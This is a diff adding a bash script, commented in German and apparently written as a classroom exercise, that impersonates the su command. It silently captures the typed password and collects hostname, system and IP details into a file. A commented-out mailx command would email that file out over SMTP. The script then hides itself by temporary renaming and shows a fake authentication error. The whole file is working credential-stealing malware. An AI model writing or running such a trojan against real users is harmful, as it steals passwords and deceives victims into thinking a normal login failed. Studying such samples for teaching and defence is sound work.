@@ -1,0 +1,61 @@
+#!/bin/bash
+# Einstellungen
+# bei Wertzuweisung zu einer Variablen keine Leerzeichen! --> VARIABLE="mein Wert"
+SLEEP=1				# Zeit ggf. an System anpassen
+RENAMETIME=30			# Zeit für Rückbenennung su
+INFOFILE="su_info"		# Datei für Informationssammlung --> verstecken
+RENAME_SCRIPT="su_rename"	# Script für Rückbenennung
+SU_HIDDEN="su_hidden"		# Zieldatei für Umbenennung
+SLEEP_BIN="/usr/bin/sleep"	# wo ist der Befehl sleep
+UNAME_BIN="/usr/bin/uname"	# wo ist der Befehl uname
+GREP_BIN="/usr/bin/grep"
+IFCONFIG_BIN="/sbin/ifconfig"
+MAILX_BIN="/usr/bin/mailx"
+MV_BIN="/usr/bin/mv"
+RM_BIN="/usr/bin/rm"
+CHMOD_BIN="/usr/bin/chmod"
+
+# Step 1: Verhalten nachbilden
+echo -n "Passwort: "	# kein Zeilenumbruch --> echo -n 
+read -s PASSWORD	# silent einlesen --> read -s
+echo ""			# Zeilenumbruch
+$SLEEP_BIN $SLEEP	# Zeit ist ggf. anzupassen, deshalb über Variable
+
+# Step 2: Informationen zu sammeln
+echo "Kommandozeilenparameter: $0 $1 $2 $3 $4"		 > $INFOFILE	# Informationen in Datei sammeln
+echo "Passwort: $PASSWORD"				>> $INFOFILE
+echo "Hostname: $HOSTNAME"				>> $INFOFILE
+echo "Betriebssystem: $($UNAME_BIN -a)"			>> $INFOFILE
+echo "IP-Adressen:"					>> $INFOFILE
+$IFCONFIG_BIN | $GREP_BIN "inet"			>> $INFOFILE
+# das soll erst mal reichen
+
+# Step 3: Informationen versenden
+#$MAILX_BIN -v \
+#	-r "ingolf.brunner@ba-leipzig.de" \
+#	-s "Passwortklau CS17-2" \
+#	-S smtp="mail.ba-leipzig.de:587" \
+#	-S smtp-use-starttls \
+#	-S smtp-auth=login \
+#	-S smtp-auth-user="username" \
+#	-S smtp-auth-password="geheim1234" \
+#	-S ssl-verify=ignore \
+#	studierende@cs17-2.ba-leipzig.de \
+# < $INFOFILE 1> /dev/null 2>&1
+$RM_BIN $INFOFILE	# Informationen versendet, File löschen
+
+# Step 4: Script für eine Zeit verstecken
+$MV_BIN "$PWD/su" "$SU_HIDDEN"	# su Script verschieben
+# Rückbenennung mittels sleep in einem Script --> Script hier erzeugen
+echo "#!/bin/bash"					 > $RENAME_SCRIPT
+echo "$RM_BIN $RENAME_SCRIPT"                           >> $RENAME_SCRIPT       # Rückbenennungsscript löschen
+echo "sleep $RENAMETIME"				>> $RENAME_SCRIPT	# warten
+echo "$MV_BIN $SU_HIDDEN $PWD/su"			>> $RENAME_SCRIPT	# su rückbenennen
+#echo "$RM_BIN $RENAME_SCRIPT"				>> $RENAME_SCRIPT  	# Rückbenennungsscript löschen
+echo "exit 0"						>> $RENAME_SCRIPT
+$CHMOD_BIN 755 $RENAME_SCRIPT
+$RENAME_SCRIPT &	# im Hintergrund ausführen
+
+# Last Step: Fehlermeldung
+echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+exit 1
